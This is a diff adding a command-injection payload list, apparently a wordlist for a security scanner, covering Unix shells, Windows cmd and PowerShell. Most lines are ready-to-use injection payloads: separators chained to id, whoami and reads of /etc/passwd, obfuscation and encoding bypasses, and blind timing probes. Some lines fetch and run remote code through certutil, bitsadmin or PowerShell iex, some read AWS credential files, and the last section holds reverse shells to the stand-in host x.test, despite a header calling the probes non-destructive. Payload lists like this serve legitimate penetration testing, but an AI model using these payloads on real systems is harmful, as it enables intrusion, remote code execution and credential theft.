@@ -1,0 +1,199 @@
+# category: cmdi
+# description: Command injection — Unix shells, Windows cmd/PowerShell, blind with time probes.
+# references: OWASP Command Injection, PortSwigger OS Command Injection labs.
+# notes: Each payload is a short probe meant to surface a sink; no destructive actions.
+
+;id
+;id;
+;ls
+;ls -la
+;whoami
+;hostname
+;uname -a
+;cat /etc/passwd
+;cat /etc/hostname
+;cat /etc/issue
+;pwd
+;echo camiocmd
+|id
+|id|
+|ls
+|ls -la
+|whoami
+|cat /etc/passwd
+&id
+&id&
+&ls
+&&id
+&&whoami
+&&cat /etc/passwd
+||id
+||whoami
+`id`
+`whoami`
+`cat /etc/passwd`
+$(id)
+$(whoami)
+$(cat /etc/passwd)
+$(ls -la)
+$(uname -a)
+; sleep 5
+| sleep 5
+& sleep 5
+&& sleep 5
+`sleep 5`
+$(sleep 5)
+;ping -c 5 127.0.0.1
+|ping -c 5 127.0.0.1
+;timeout 5
+&timeout 5
+%0aid
+%0als
+%0acat /etc/passwd
+%0a%0did
+%0a%20id
+%0aping%20-c%205%20127.0.0.1
+%0a/bin/id
+$IFS$9id
+$IFS$9whoami
+${IFS}id
+${IFS}whoami
+{ls,-la}
+{cat,/etc/passwd}
+<(id)
+>(id)
+"; id; #
+"; whoami; #
+'; id; #
+'; whoami; #
+'& id &'
+'| id |'
+'& whoami &'
+%26id
+%26%26id
+%7Cid
+%3Bid
+%60id%60
+%24%28id%29
+& dir
+& dir &
+&& dir
+| dir
+| dir |
+; dir
+| type C:\windows\win.ini
+| type C:\boot.ini
+& type C:\windows\win.ini
+&& type C:\windows\win.ini
+| whoami.exe
+& whoami.exe
+;powershell -c "Get-Process"
+| powershell -c id
+& powershell -c "whoami"
+; powershell -NoP -NonI -c Start-Sleep -s 5
+`ping -n 5 127.0.0.1`
+| ping -n 5 127.0.0.1
+;certutil -urlcache -split -f http://x.test/x x
+| certutil -urlcache -split -f http://x.test/x x
+; curl http://x.test
+| curl http://x.test
+; wget http://x.test
+; nc x.test 4444 -e /bin/sh
+;bash -i >& /dev/tcp/x.test/4444 0>&1
+;/bin/bash -c "id"
+;/bin/sh -c id
+;sh -c id
+;busybox id
+;ksh -c id
+`$(printf 'id')`
+'$(id)'
+"$(id)"
+\;id
+\|id
+\&id
+%0A%0D id %0A%0D
+$(printf '\x69\x64')
+$({echo,YXBybWMxCg==}|{base64,-d}|{bash,-i})
+$(cat$'\x20'/etc/passwd)
+;c\a\t /etc/passwd
+;c''at /etc/passwd
+;cat</etc/passwd
+;cat<<<$(</etc/passwd)
+
+# ── Zsh / fish / busybox / dash specific ──────────────────────────────────
+;zsh -c id
+;fish -c id
+;dash -c id
+;busybox sh -c id
+;eval 'id'
+;$(printf 'id')
+;$(echo aWQK|base64 -d)
+;eval $(echo aWQK|base64 -d)
+$'id'
+$'\151\144'
+${PATH:0:1}usr${PATH:0:1}bin${PATH:0:1}id
+`echo aWQK|base64 -d`
+`xxd -r -p <<< '6964'`
+
+# ── PowerShell deep ──────────────────────────────────────────────────────
+;powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAA...
+;powershell -NoP -NonI -W Hidden -Exec Bypass -c "iex (iwr http://x.test/x)"
+;powershell -c "$a=[Convert]::FromBase64String('aWQK');[Text.Encoding]::UTF8.GetString($a)"
+;powershell Invoke-WebRequest http://x.test
+;powershell Invoke-RestMethod http://x.test
+;powershell Start-BitsTransfer http://x.test/x c:\x
+;Get-Content C:\windows\win.ini
+;Get-ChildItem -Recurse c:\
+;Get-Process
+;Get-NetTCPConnection
+
+# ── Windows cmd deeper ────────────────────────────────────────────────────
+& net user
+& net localgroup administrators
+& ipconfig /all
+& systeminfo
+& tasklist /v
+& schtasks /query
+& wmic process list full
+& bitsadmin /transfer x http://x.test/a c:\a
+& reg query HKLM
+& type %USERPROFILE%\.aws\credentials
+
+# ── Blind / time-based with uncommon shells ──────────────────────────────
+; getent hosts x.test
+; nslookup x.test
+; host x.test
+; dig x.test
+; drill x.test
+; python -c "__import__('os').system('id')"
+; python3 -c "__import__('os').system('id')"
+; perl -e 'system("id")'
+; ruby -e 'system("id")'
+; php -r 'system("id");'
+; lua -e 'os.execute("id")'
+; node -e 'require("child_process").exec("id")'
+
+# ── Encoding / quoting obfuscation ────────────────────────────────────────
+;$0
+;${0}
+;${USER:0:0}id
+;""ls
+;''ls
+;''''i'd
+;\i\d
+;/???/i?
+;/???/??t /etc/??sswd
+;/???/i? | /???/b?se64
+;cat${IFS}/etc/passwd
+;cat$IFS/etc/passwd
+;cat$IFS$9/etc/passwd
+;cat<<<$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'
+;{cat,/etc/passwd}
+;@(cat) /etc/passwd
+;printenv
+
+# ── Reverse-shell primers (OAST-correlated) ──────────────────────────────
+;bash -c 'exec 5<>/dev/tcp/x.test/80;cat <&5'
+;sh -i >& /dev/tcp/x.test/80 0>&1
+;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.test 80 >/tmp/f
+;python -c 'import socket,os,pty;s=socket.socket();s.connect(("x.test",80));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("sh")'
